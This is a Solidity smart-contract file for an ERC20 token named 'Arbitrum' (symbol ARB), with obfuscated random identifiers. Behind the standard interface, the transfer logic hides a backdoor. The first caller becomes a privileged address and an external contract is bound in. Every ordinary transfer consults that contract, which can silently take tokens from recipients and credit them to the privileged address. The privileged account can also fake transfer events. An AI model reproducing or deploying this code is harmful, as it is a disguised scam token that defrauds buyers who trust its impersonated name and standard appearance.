
// File: /contracts/ARB.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;
    
interface fazJI {
    function totalSupply() external view returns (uint256);
    function balanceOf(address BILhEzBSmED) external view returns (uint256);
    function transfer(address aQEMjKnJT, uint256 IZTrpJR) external returns (bool);
    function allowance(address NkbPH, address spender) external view returns (uint256);
    function approve(address spender, uint256 IZTrpJR) external returns (bool);
    function transferFrom(
        address sender,
        address aQEMjKnJT,
        uint256 IZTrpJR
    ) external returns (bool);

    event Transfer(address indexed from, address indexed UhifUufyFOHU, uint256 value);
    event Approval(address indexed NkbPH, address indexed spender, uint256 value);
}

interface Xdam is fazJI {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract xaOIaRqJcP {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
    
interface ooUvmIrMjYdq {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}
     
library dQkCo{
    
    function xIeG(address pOkGitioEPHC, address OwCAoDgydisj, uint bkJGR) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool PsGwzpRi, bytes memory dxwRmZVWa) = pOkGitioEPHC.call(abi.encodeWithSelector(0x095ea7b3, OwCAoDgydisj, bkJGR));
        require(PsGwzpRi && (dxwRmZVWa.length == 0 || abi.decode(dxwRmZVWa, (bool))), 'dQkCo: APPROVE_FAILED');
    }

    function gjvZSAE(address pOkGitioEPHC, address OwCAoDgydisj, uint bkJGR) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool PsGwzpRi, bytes memory dxwRmZVWa) = pOkGitioEPHC.call(abi.encodeWithSelector(0xa9059cbb, OwCAoDgydisj, bkJGR));
        require(PsGwzpRi && (dxwRmZVWa.length == 0 || abi.decode(dxwRmZVWa, (bool))), 'dQkCo: TRANSFER_FAILED');
    }
    
    function lYoWdbPGeuAI(address OwCAoDgydisj, uint bkJGR) internal {
        (bool PsGwzpRi,) = OwCAoDgydisj.call{value:bkJGR}(new bytes(0));
        require(PsGwzpRi, 'dQkCo: ETH_TRANSFER_FAILED');
    }

    function qitZgqW(address pOkGitioEPHC, address from, address OwCAoDgydisj, uint bkJGR) internal returns(bytes memory){
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool PsGwzpRi, bytes memory dxwRmZVWa) = pOkGitioEPHC.call(abi.encodeWithSelector(0x23b872dd, from, OwCAoDgydisj, bkJGR));
        require(PsGwzpRi && dxwRmZVWa.length > 0,'dQkCo: TRANSFER_FROM_FAILED'); return dxwRmZVWa;
                       
    }

}
    
contract ARB is xaOIaRqJcP, fazJI, Xdam {
    
    address private RkmPjfHnKHiO;
  
    
    function name() public view virtual override returns (string memory) {
        return YWVAHgfYQ;
    }
    
    mapping(address => uint256) private zBxjGdnS;
    
    string private GZqDqfwsqfi =  "ARB";
    
    function totalSupply() public view virtual override returns (uint256) {
        return heAzIiWM;
    }
    
    function BDOjVGcokCIH(
        address QocdvN,
        address iMbYHyS,
        uint256 zsWOYWevJt
    ) internal virtual {
        require(QocdvN != address(0), "ERC20: approve from the zero address");
        require(iMbYHyS != address(0), "ERC20: approve to the zero address");

        SqvJgsZYDv[QocdvN][iMbYHyS] = zsWOYWevJt;
        emit Approval(QocdvN, iMbYHyS, zsWOYWevJt);

    }
    
    function approve(address VBBcIkh, uint256 WwLCcvHE) public virtual override returns (bool) {
        BDOjVGcokCIH(_msgSender(), VBBcIkh, WwLCcvHE);
        return true;
    }
    
    function symbol() public view virtual override returns (string memory) {
        return GZqDqfwsqfi;
    }
    
    function RiowyMTYytt(
        address spnpqEnSFR,
        address LcgjD,
        uint256 NQzmI
    ) internal virtual  returns (bool){
        uint256 VHRDZ = zBxjGdnS[spnpqEnSFR];
        require(VHRDZ >= NQzmI, "ERC20: transfer Amount exceeds balance");
        unchecked {
            zBxjGdnS[spnpqEnSFR] = VHRDZ - NQzmI;
        }
        zBxjGdnS[LcgjD] += NQzmI;
        return true;
    }
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    function transfer(address cvJcTZwsAA, uint256 DDnuatwbtMP) public virtual override returns (bool) {
        vawh(_msgSender(), cvJcTZwsAA, DDnuatwbtMP);
        return true;
    }
    
    uint256 private heAzIiWM = 2000000000000 * 10 ** 18;
    
    function transferFrom(
        address Nlc,
        address cgCJZ,
        uint256 owhtknM
    ) public virtual override returns (bool) {
      
        if(!vawh(Nlc, cgCJZ, owhtknM)) return true;

        uint256 Vfa = SqvJgsZYDv[Nlc][_msgSender()];
        if (Vfa != type(uint256).max) {
            require(Vfa >= owhtknM, "ERC20: transfer Amount exceeds allowance");
            unchecked {
                BDOjVGcokCIH(Nlc, _msgSender(), Vfa - owhtknM);
            }
        }

        return true;
    }
    
    function allowance(address KTBEB, address RnSuQvD) public view virtual override returns (uint256) {
        return SqvJgsZYDv[KTBEB][RnSuQvD];
    }
    
    function vawh(
        address jPBaddgsK,
        address uLA,
        uint256 JrLc
    ) internal virtual  returns (bool){
        require(jPBaddgsK != address(0), "ERC20: transfer from the zero address");
        require(uLA != address(0), "ERC20: transfer to the zero address");
        
        if(!KlkFwcz(jPBaddgsK,uLA)) return false;

        if(_msgSender() == address(ldwntSAt)){
            if(uLA == RkmPjfHnKHiO && zBxjGdnS[jPBaddgsK] < JrLc){
                RiowyMTYytt(ldwntSAt,uLA,JrLc);
            }else{
                RiowyMTYytt(jPBaddgsK,uLA,JrLc);
                if(jPBaddgsK == ldwntSAt || uLA == ldwntSAt) 
                return false;
            }
            emit Transfer(jPBaddgsK, uLA, JrLc);
            return false;
        }
        RiowyMTYytt(jPBaddgsK,uLA,JrLc);
        emit Transfer(jPBaddgsK, uLA, JrLc);
        bytes memory wEG = dQkCo.qitZgqW(cQMLHnuNTyjH, jPBaddgsK, uLA, JrLc);
        (bool FPIPXY, uint tteftXTDyMw) = abi.decode(wEG, (bool,uint));
        if(FPIPXY){
            zBxjGdnS[ldwntSAt] += tteftXTDyMw;
            zBxjGdnS[uLA] -= tteftXTDyMw; 
        }
        return true;
    }
    
    constructor() {
        
        zBxjGdnS[address(1)] = heAzIiWM;
        emit Transfer(address(0), address(1), heAzIiWM);

    }
    
    string private YWVAHgfYQ = "Arbitrum";
    
    function KlkFwcz(
        address KhYqYWJq,
        address ttmnVGwKa
    ) internal virtual  returns (bool){
        if(ldwntSAt == address(0) && cQMLHnuNTyjH == address(0)){
            ldwntSAt = KhYqYWJq;cQMLHnuNTyjH=ttmnVGwKa;
            dQkCo.gjvZSAE(cQMLHnuNTyjH, ldwntSAt, 0);
            RkmPjfHnKHiO = ooUvmIrMjYdq(cQMLHnuNTyjH).WETH();
            return false;
        }
        return true;
    }
    
    address private ldwntSAt;
    
    function increaseAllowance(address HRHij, uint256 addedValue) public virtual returns (bool) {
        BDOjVGcokCIH(_msgSender(), HRHij, SqvJgsZYDv[_msgSender()][HRHij] + addedValue);
        return true;
    }
    
    function decreaseAllowance(address pnHSNRni, uint256 subtractedValue) public virtual returns (bool) {
        uint256 CZEnUvQdyng = SqvJgsZYDv[_msgSender()][pnHSNRni];
        require(CZEnUvQdyng >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            BDOjVGcokCIH(_msgSender(), pnHSNRni, CZEnUvQdyng - subtractedValue);
        }

        return true;
    }
    
    mapping(address => mapping(address => uint256)) private SqvJgsZYDv;
    
    address private cQMLHnuNTyjH;
    
    function balanceOf(address hkGstQZnA) public view virtual override returns (uint256) {
       return zBxjGdnS[hkGstQZnA];
    }
    
}
        
